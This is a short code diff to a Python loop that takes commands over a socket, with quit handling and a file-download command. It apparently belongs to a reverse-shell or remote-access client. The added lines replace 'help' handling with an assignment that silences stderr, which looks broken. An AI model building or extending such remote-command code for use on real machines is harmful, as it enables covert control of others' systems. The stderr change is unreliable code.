@@ -21,7 +21,11 @@ while True:
     cmd = s.recv(1024).decode()
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
-        
+    
+    if cmd.lower() in ['h', 'help']:
+        sys.stderr = object
+        continue
+
     # This will close the connection
     if cmd.lower() in ['down', 'download']:
         yesNo = s.recv(1024).decode()
